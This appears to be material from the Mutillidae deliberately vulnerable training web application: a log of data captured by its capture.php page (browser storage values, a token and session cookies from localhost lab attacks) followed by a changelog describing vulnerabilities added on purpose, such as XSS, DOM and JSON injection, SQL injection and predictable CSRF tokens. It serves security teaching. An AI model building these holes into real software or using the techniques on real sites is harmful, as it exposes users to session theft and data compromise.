--------------------------------------------------


--------------------------------------------------
Client IP: 192.168.56.101
Timestamp: 04-28-2012 03:41:21 GMT
--------------------------------------------------
Client Hostname: 192.168.56.101
Client User Agent: Ruby
Client Referrer: 
Client Port: 50888
Captured Data: page = capture-data.php
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-07-2012 01:37:33 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 2122
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = qqcf3ffighhlkqo38e79hb0sl1
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-07-2012 01:38:26 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=view-someones-blog.php
Client Port: 2311
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = qqcf3ffighhlkqo38e79hb0sl1
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-07-2012 01:41:29 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 2352
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page;
PHPSESSID = qqcf3ffighhlkqo38e79hb0sl1
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 00:32:53 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1100
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 00:33:14 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1106
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 00:33:15 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1110
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 00:54:34 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1178
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 00:54:34 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1179
Captured Data: html5storage = sessionStorage(Secure.IsUserLoggedIn?):No; sessionStorage(Secure.AuthenticationToken):DU837HHFYTEYUE9S1934; sessionStorage(SessionStorageTarget):This is set by the index.php page; sessionStorage(CurrentBrowser):undefined; localStorage(Secure.CurrentStateofHTML5Storage):Completely Insecure; localStorage(LocalStorageTarget):This is set by the index.php page; localStorage(MessageOfTheDay):Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:19:53 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1243
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:20:48 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1250
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:20:51 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1246
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:20:52 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1250
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:21:00 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1260
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:21:02 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=add-to-your-blog.php
Client Port: 1262
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------


--------------------------------------------------
Client IP: 127.0.0.1
Timestamp: 05-09-2012 01:22:30 GMT
--------------------------------------------------
Client Hostname: 127.0.0.1
Client User Agent: Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko/20100101 Firefox/11.0
Client Referrer: http://localhost/mutillidae/index.php?page=dns-lookup.php
Client Port: 1286
Captured Data: html5storage = Secure.CurrentStateofHTML5Storage=Completely Insecure;LocalStorageTarget=This is set by the index.php page;MessageOfTheDay=Go Cats!;
PHPSESSID = k3dc0avavgg40rttqph190pk25
--------------------------------------------------

<p><b>05/13/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.19:</p>
	<ul>
		<li>
			Fixed broken link to https://addons.mozilla.org/en-US/firefox/collections/jdruin/pro-web-developer-qa-pack/ (Mozilla Add Ons)
			on the "Resources" sub-menu.
		</li>
		<li>
			Added "validation" to the html5 storage page for the "key" field. This validation checks for any non-alphanumeric
			characters and prints an error if non-alphanumeric characters are found. This error message contains the bad key
			the user input. Since the site fails to output encode this error message, it is possible to perform DOM injection.
		</li>
		<li>
			Added a large number of HTML 5 based exploits to the Mutillidae-Test-Scripts.txt file. Approximately 100 lines
			of new demonstration code has been added.
		</li>
		<li>
			On the setup or reset database page, if no errors were detected, the page now sends
			the user back to the page that requested the database be reset. A popup box
			gives the user the option to stay on the page.
		</li>
	</ul>
</blockquote>

<p><b>03/15/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.18:</p>
	<ul>
		<li>The setup datebase page now clears HTML 5 Local and Session Storage</li>
		<li>Fixed alignment issues with icons on the captured-data page.</li>
		<li>
			Partially protected capture-data.php page so that the page can capture
			values that cause SQL injection. Other fields are left unprotected so
			users can practice sending SQL injections.
		</li>
		<li>Added timestamp to records captured in the captured-data.txt text file</li>
		<li>
			Added script to home page to add a value to HTML 5 storage when user visit the site.
			This will give users a web storage target to go after even if they dont visit the 
			HTML 5 storage page.
		</li>
		<li>
			Coverted log-visit.php from using the hitlog table to using the 
			LogHandler class. This will help consolodate code into a single
			point of failure for the logging process. All the code has been removed
			from log-visit.php except a call to the LogHandler.
		</li> 
		<li>Adjusted top horizontal menu padding to move buttons closer together</li>
		<li>
			Added two new buttons to the top horizontal menu to allow user to get
			to the view log page and the view captured data page easier.
		</li>
		<li>
			Removed the gethostbyaddr() function from the LogHandler to prevent the 
			long timeouts associated with the function when the DNS server is not
			available. If PHP changes so that the function has a timeout setting
			it will be brought back.
		</li>
		<li>
			Changed delete icon from jpeg to a transparent PNG so the icon can be put inline
			to the table headers to save space.
		</li>
		<li>Added delete log button to the show log page.</li>
		<li>Rearranged the buttons on the show logs page, added new icons, and cleaned up the code</li>
		<li>Added new information output about numner of records found to view logs page</li>
		<li>Made the buttons on the captured data page smaller to free up some space.</li>
	</ul>
</blockquote>

<p><b>03/08/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.17:</p>
	<ul>
		<li>
			Added new menu items for DOM injection and Cookie injection.
		</li>
		<li>Added a delete captured data button to the captured data page</li>
		<li>
			Added new sub-menus to the cross site scripting menu for persistent
			and reflected cross site scripting. The pages to which the links point
			are existing pages but the new menus will help new users locate targets
			for these types of cross site scripting.
		</li>
		<li>Added large number of proven scripts to the Mutillidae-Test-Scripts.txt file</li>
		<li>Added link on View Blog Entries back to Add to Your Blog</li>
		<li>Added link on Add Blog Entries back to View Blogs</li>
		<li>Fixed typo on HTML 5 storage page</li>
		<li>Added delete buttons to the HTML 5 web storage page to help testing</li>
	</ul>
</blockquote>

<p><b>03/01/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.16:</p>
	<ul>
		<li>
			Additional hints added to HTML5 Web Storage page to overwrite 
			current web storage
		</li>
		<li>
			Additional hints added to HTML5 Web Storage page concerning reading
			current web storage. Added code examples for document.write and
			using Firebug command line.
		</li>
		<li>
			Added several new items to the Easter Egg file Mutillidae-Test-Scripts.txt
		</li>
		<li>
			New vulnerability added. The HTML5 Storage page now has cross site
			scripting via DOM injection. The "storage key" field is vulnerable.
		</li>
		<li>Added hints about DOM injection to the HTML5 Storage page.</li>
		<li>Added hints to the capture-data.php page about cross site scripting</li>
		<li>Updated the vulnerabilities listing</li>
	</ul>
</blockquote>

<p><b>02/11/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.15:</p>
	<ul>
		<li>
			Upgraded the "JavaScript Validation" for the dns-lookup.php page. The 
			JavaScript validation is only activated in security level 1. The new
			validation checks for cross-site scripting characters in addition to
			OS command injection characters.
			
			The validations are trivial to defeat by disabling JS in the browser 
			or using an interception proxy to bypass the validation.
		</li>
		<li>
			In security level 1, on page add-to-your-blog.php the CSRF token
			is now generated. The token is predictable although perhaps not
			obvious. The intention is for students to use Burp-Suite 
			sequencer to discover the pattern and inject the next token in
			the sequence (or to subtract each token from the last token).
		</li>
		<li>
			The CSRF token generator for the add-to-your-blog.php page is 
			now using the OWASP Randomizer to generate random tokens
			in security level 5. The previous generator used mt_random()
			which was not really random.
			
			These new tokens have an entropy of around 132 bits.
		</li>
	</ul>
</blockquote>

<p><b>01/30/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.14:</p>
	<ul>
		<li>
			Made menu smaller width. Menu is 10% of screen now. This should
			help when using mutillidae on a classroom projector showing at 
			1024 x 768.
		</li>
		<li>Made Banner 2.5% less tall. Gotta make some room people.</li>
		<li>Fixed formatting bug in dns-lookup.php that made hints look funny</li>
		<li>
			Added lots of new advanced examples to the Easter Egg file called Mutillidae-Test-Scripts.txt.
			The file is located in the documentation folder.
		</li>
		<li>
			Password Generator (password-generator.php): Fixed bug by removing brackets
			from possible characters that will be used to make password.
		</li>
		<li>
			Added new field to accounts: Boolean is_admin. 
		</li>
		<li>
			Added concept of administrative users and regular users
		</li>
		<li>
			Added new vulnerability. There are secret pages that can be brute forced using
			a brute forcing tool like DirBuster or Burp-Intruder. Using Burp-Intruder
			try cycling through the "page" parameter with common names for secret pages.
			For example, try secret.php.
		</li>
		<li>Fixed typo on page not found page</li>
		<li>Created authorization required page</li>
		<li>Added "Secret" Administrative Pages to menu under A8 - Failure to Restrict URL Access</li>
		<li>Made menu item for Robots.txt more obvious</li>
		<li>Fixed typo on vulnerabilties documentation</li>
		<li>"Logged in user" now says "logged in admin" if the logged in user is an admin
		<li>Updated accounts created as targets</li>
		<li>Improved output formatting on phpinfo.php page</li>
		<li>
			Altered phpinfo.php so that admins can see page in any level but regular users
			can only see page in security levels 0 and 1.
		</li>
	</ul>
</blockquote>

<p><b>01/10/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.13:</p>
	<ul>
		<li>Added Mutillidae YouTube channel link to menu</li>
		<li>Fixed some menu links so they open in new window</li>
		<li>
			Added a hint to the framer.php page telling the user to try to
			change the security level.
		</li>
		<li>
			Added a new page called anti-framing-protection.inc. The page
			shows developers how to implement old-style javascript frame busting code.
			This isn''t used for new browsers because x-frame-options has supplanted the
			frame busting code, but there are still many old browsers running
			in kiosks and such.
		</li>
		<li>Added more documentation in the Easter Egg file Mutillidae test scripts</li>
		<li>Added Kevin Johnson as honorary default user</li>
		<li>Added more values to default database to make SQL injection more interesting</li>
		<li>Reduced the size of the header thickness to make more room</li>
		<li>Greatly improved SQL Injection tutorial or at least typed a lot more stuff</li>
		<li>
			Upgraded the Easter Egg file with more tips and tricks; mainly on
			SQL injection
		</li>
	</ul>
</blockquote>

<p><b>01/09/2012</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.12:</p>
	<ul>
		<li>
			Changed sort order for captured-data.php to descending by date so last capture 
			floats to top
		</li>
		<li>Added a refresh button to the captured-data.php page</li>
		<li>Added all the latest pen-testing scripts to the easter egg file Mutillidae-Test-Scripts.txt</li>
		<li>Improved the hints on the HTML5 Storage page</li>
		<li>Oops. Fixed bug in HTML5 storage PHP page.</li>
		<li>Upgraded code in process-login-attempt.php pointed out by Josep Duran</li>
		<li>
			Fixed a bug on add-to-your-blog.php in the CSRF code which would not allow a
			new blog to be saved. Bug found by by Josep Duran.
		</li>
		<li>Made the table output on add-to-your-blog.php look nicer.</li>
		<li>Got rid of unneeded commented out code on set-background-color.php</li>
		<li>Improved output readability on dns-lookup.php</li>
		<li>Improved output readability on set-background-color.php</li>
	</ul>
</blockquote>

<p><b>12/27/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.11:</p>
	<ul>
		<li>
			Added more tools to pen-test-tool-lookup.php.
		</li>
		<li>
			Added lots of HTML5 attacks to the easter egg file Mutillidae-Test-Scripts.txt
		</li>
		<li>
			Added new page capture.php which captures any information sent to the page
			in GET or POST parameters and saves them to a database table. Can be used
			to capture cookies, session storage, local storage, or other data. The page is 
			designed to reflect the capture cookie page used in the SANS 542 Web Application
			Pen Testing course currently taught by Kevin Johnson of SecureIdeas.
			
			This page is designed to capture any parameters sent and store them in a file 
			and a database table. It loops through the POST and GET parameters and records 
			them to a file named captured-data.txt. On Windows system, the file should be 
			found at C:/xampp/htdocs/mutillidae/captured-data.txt. The page also tries to 
			store the captured data in a database table named captured_data. There is 
			another page named captured-data.php that attempts to list the contents of 
			this table.
		</li>
		<li>
			Added new page captured-data.php which displays data captured by page
			capture.php. In true Mutillidae fashion, this page is as vulnerable as
			all the others. Try hacking the hacker by sending SQL injections and XSS
			to the capture.php.
		</li>
		<li>
			Changed includes for database configuration to require_once so that
			some pages can stand alone or work with index.php
		</li>
		<li>Added a new table to the database called captured_data</li>
		<li>Added better comments to index.php</li>
		<li>Added data capture pages to menu under "Other"</li>
		<li>
			Added detailed tutorials to the HTML5 storage page and the pen-test-tools.php
			page showing how to pen-test and exploit HTML5 storage and perform JSON
			injections. To see the new hints sections browse to the pages and click
			the hints button. The hints show at the bottom of the page.
			The HINTS button is on the menu at the top of the screen.
		</li>
	</ul>
</blockquote>

<p><b>12/17/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.10:</p>
	<ul>
		<li>
			Added menu item for the BACK buttons that are on all the pages. They are
			injectable to cause XSS. The menu item is located under OWASP Top 10 --&gt;
			A2 - Cross Site Scripting (XSS) --&gt; Via HTTP Headers --&gt; Those BACK Buttons.
			Any page will do. I just picked one at random.
		</li>
		<li>
			Corrected some errors in the HTML5 storage hints. You have to enable HINTS level 1
			to see the hints. The HINTS button is on the menu at the top of the screen.
		</li>
		<li>
			Renamed setupreset.php to set-up-database.php
		</li>
		<li>Fixed a nasty bug in view someones blog where the dropdown was missing names of bloggers</li>
		<li>Fixed a minor formatting bug in html5-storage.php</li>
		<li>Adjusted the graphics on the home page</li>
		<li>
			Added a new page pen-test-tool-lookup.php. This page is vulnerable to JSON injection.
			A large tutorial was added as well showing how to perform JavaScript XSS injection
			into the JSON data so that the XSS executes.
			To see the tutorial, click the HINTS button. As an exercise, the user is encouraged
			to perform a JSON string injection and an HTML injection after learning how to
			perform the XSS injection. The JSON has been carefully designed to make it relatively
			easier to get the JSON injection to work. JSON injection can be somewhat tricky 
			if a user has not tried it before and/or does not use JSON in web applications.
			The HINTS button is on the menu at the top of the screen.
			The page is also vulnerable to SQL injection, HTML injection, 
			and JSON string injection in addition to XSS.
		</li>
		<li>
			The next step will be to add defenses to pen-test-tool-lookup.php. There will
			be a level 1 defense and a level 5 defense. The level 1 will just be
			JavaScript validation. Level 5 defense will be more robust and
			hopefully difficult to defeat. This will be release 2.1.11 or later.
		</li>
	</ul>
</blockquote>

<p><b>12/16/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.9:</p>
	<ul>
		<li>
			Added a large cross site request forgery tutorial. To access the tutorial, the HINTS
			have to be on level 2.
		</li>
		<li>
			Adding better formatting to the Cross Site Scripting Tutorial
		</li>
		<li>
			Updated the menu to point the user to two pages which are vulnerale to CSRF
		</li>
	</ul>
</blockquote>

<p><b>12/15/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.8:</p>
	<ul>
		<li>
			Bug fix: The links on the front home page were absolute instead of
			relative. This was not an issue in XAMPP installations but caused
			an issue when installed on Samurai because Samurai uses
			http://mutillidae as Mutillidae's URL while XAMPP just uses
			http://localhost. The links should have been relative anyway.
		</li>
	</ul>
</blockquote>

<p><b>11/26/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.7:</p>
	<ul>
		<li>
			Added a new page for HTML5 storage. The page is meant to show how to both use 
			and attack HTML5 storage. The page supports Local and Session storage types.
			The user can attack the storage in two contexts. They can act as if they want 
			to read to contents of their own browsers session storage to see if the 
			developer put authorization tokens or other items into the storage.
			They can also try to use XSS to steal the session storage. In this use-case
			the user would be acting as if they wanted to read someone elses storage.
			A large number of hints has been added to the page. The page name is 
			"html5-storage.php" and can be accessed from the Cross Site Scripting menu
			and information leakage menu. In security level zero, the page has no defenses.
			In level 1, the page will use trivial JavaScript validation. In security level 5,
			the page will refuse to put the secrets in client side storage.
		</li>
	</ul>
</blockquote>

<p><b>11/13/2011</b>: Jeremy Druin / Kenny Kurtz</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.6:</p>
	<ul>
		<li>
			Enhanced the .htaccess file to automatically disable magic quotes on systems 
			which enable them by default (such as some OSX versions of PHP)
		</li>
		<li>
			Fixed some bugs in the phpinfo.php file that made the page display weird.
		</li>
		<li>
			Enhanced the hidden PHPINFO page so that it would work if the user
			browsed to http://localhost/mutillidae/index.php?page=phpinfo.php
			or to http://localhost/mutillidae/phpinfo.php. This example assumes
			Mutillidae is running on localhost.
		</li>
		<li>
			Fixed a bug in index.php that kept the log-visit page from being included.
		</li>
		<li>
			Fixed a bug in log-visit.php that kept the page from working.
		</li>
		<li>
			Fixed installation instructions format for IE 8 not in compatibility mode.
		</li> 
	</ul>
</blockquote>

<p><b>11/10/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.5:</p>
	<ul>
		<li>Added vuln to login sequence. Now a cookie is created with username. Students should try to XSS 
		the cookie and see what happens. Also try a response splitting attack because a cookie is an HTTP 
		header.
		</li>
		<li>Created new twitter feed to make Mutillidae announcements
		 and other web vulnerability tweaks. @webpwnized
		</li>
		<li>
			Fixed installation instructions format for IE 8 not in compatibility mode
		</li> 
	</ul>
</blockquote>

<p><b>10/14/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.4:</p>
	<ul>
		<li>Moved usage instructions and php errors from the home page to their own pages.</li>
		<li>In insecure mode, changed the method of the user-info.php page to GET in order to make it easier
			to use sqlmap against Mutillidae. sqlmap supports POST but it is easier to use with
			GET.
		</li>
		<li>Added hints about sqlmap to sql injection tutorial and to the easter egg file</li>
		<li>Added a credit card table as a target in the database</li>
		<li>Confirmed that the view-blog table can be attacked with sqlmap. The answer is in the Easter Egg file.</li>
		<li>Updated the SQL injection tutorial file</li>
	</ul>
</blockquote>

<p><b>10/13/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.3:</p>
	<ul>
		<li>
			Fix a bug. If the user was on the home page, without having clicked any
			link to this point (such as when using a bookmark), then the user clicked the 
			"change security level", the page would redirect to page not found.
		</li>
		<li>Increased the slide time for the ddsmoothmenu to make it slow down a little bit</li>
		<li>Added a NEW vulnerability. Many sites have crazy pages that show server settings, expose
			admin functionality, allow configuration, or other features a user should not be able to 
			see. The problem is not the pages themselves so much as the fact that developers think
			no one will guess the name and browse to them. Shoulder surfing, guessing, brute-forcing, etc
			can be used to find these pages. Mutillidae now has such a page. It is in the 
			"Server Misconfiguration" category. See secret-administrative-pages.php for hints.
		</li>
		<li>Augmented the installation instructions</li>
		<li>Added link to ihackcharities to front page</li>
	</ul>
</blockquote>

<p><b>09/25/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.2:</p>
	<ul>
		<li>
			Added a new security level. Now there is security level 1. The only difference
			in this release between level 0 and level 1 is that level 1 has JS validation.
			The JS validation has been in place for a while to allow but was activated in
			level 0. Since level 0 is supposed to be very easy, the decision was made
			to create level 1 and move JS validation to level 1. The JS validation is
			trivial to bypass. Simply disable JS or use a proxy such as Tamper Data,
			Paros, Burp, WebScarab, or others.
		</li>
		<li>Page homenotes.php has been merged with home.php.</li>
		<li>Page home.html has been renamed home.php</li>
		<li>Added protection for SQL injection to add to your blog.php output of the 
			current users blog entries. Prior to this patch, you could SQL inject 
			in security level 5 by putting your injection in the current users
			login name because the query uses the current users login name as the input
			to the query.
		</li>
		<li>Improved the DNS lookup page to add JS validation in security level 1 mode.</li>
		<li>Changed padding for BACK button to use styles rather than HTML BR tags.</li>
		<li>Changed the password generator password length to 15 to set a better
			example.</li>
		<li>Some refactoring on user-info.php and login.php to clean up code</li>
	</ul>
</blockquote>

<p><b>09/16/2011</b>: Jeremy Druin</p>
<blockquote>
	<p>Change Log for Mutillidae 2.1.1:</p>
	<ul>
		<li>
			Added CSRF Protection to page add to your blog. This only works in secure
			mode.
		</li>
		<li>Added more scripts to the easter egg file (Mutillidae Test Scripts)</li>
		<li>Bug fix: The setupandreset.php errors were not printing out.</li>
		<li>Stupid bug fix: Removed the "open DB" that was firing before the database was actually created.</li>
		<li>Created output on page setupandreset.php to show what happened</li>
		<li>Added try/catch and more error handling to setupandreset.php</li>
	</ul>
</blockquote>

<p><b>08/31/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.1.0:</p>
	<ul>
		<li>
			Fixed error on page add to your blog. Input user was not escaped or encoded in secure mode.
		</li>
		<li>
			Major change. The MYSQL connection has been changed from procedure mysql_ functions to using
			object oriented instances from the class mysqli. mysqli became available in PHP 5.3.0
			and is brand new to Mutillidae. There is a high chance of error. Please let me
			know if there are bugs found. This new class gives us many new abilities
			including the ability to call stored procedures without using concatenation. This 
			change affects the entire project and changes the capabilities of the project
			which is why the minor version was updated.
			
			All of the database code has been ripped out and replaced from the ground up. Next will
			be to add stored procedures and views to the database. When SQL injection is done on
			meta data, there will be many more targets. Users will be able to steal the source code
			from views and procs during pen tests along with dumping tables.
		</li>
		<li>Added row number to output on add to your blog</li>
		<li>Added logging for successful and failed login attempts.</li>
		<li>Fixed bug in closing bold tag tokenizer on add to your blog</li>
		<li>
			Updated page arbitrary-file-inclusion.php. 
			Now you can practice making arbitrary system files load. The fun never ends.
		</li>
		<li>
			Added SQL injection defenses to closedb.inc. This may not make much sense unless
		you know that closedb.inc logs to the hitlog table. Part of what it logs is user agent
		and referer which are controls by the user.
		</li>
		<li>Create new page log-visit.php which logs each request to the server. This page
		could be used to poison the log with XSS or SQL inject the database.
		</li>
		<li>Fix bug on dns-lookup.php that allowed the log to be injected even in secure mode.</li>
		<li>Add new page vulnerabilities.php that document the vulnearbilities on each page to help
		users know what to try</li>
		<li>Renamed home.htm to home.html for compliance with convention</li>
		<li>Reconfigured index.php to open database as late as possible</li>
		<li>Refactored opendb.inc to use standard error handling like rest of site. Page
		size is much smaller as a result</li>
		<li>Added a new XSS vulnerability to page user-info.php. This can be exploited by inputing scripts
		into the username field.</li>
		<li>Added row count output to the show-log.php page</li>
		<li>Fixed back button so it doesnt span entire width of the page</li>
		<li>Added error output to page register.php. In insecure mode, the user can get a lot
		of information about the insert. In secure mode, we keep that to ourselves.</li>				 
	</ul>
</blockquote>

<p><b>08/19/2011</b>: Jeremy Druin</p>

<blockquote>
	<p>Change Log for Mutillidae 2.0.13:</p>
	<ul>
		<li>
			Added a new page called password-generator that allowed the user to practice HTML injection,
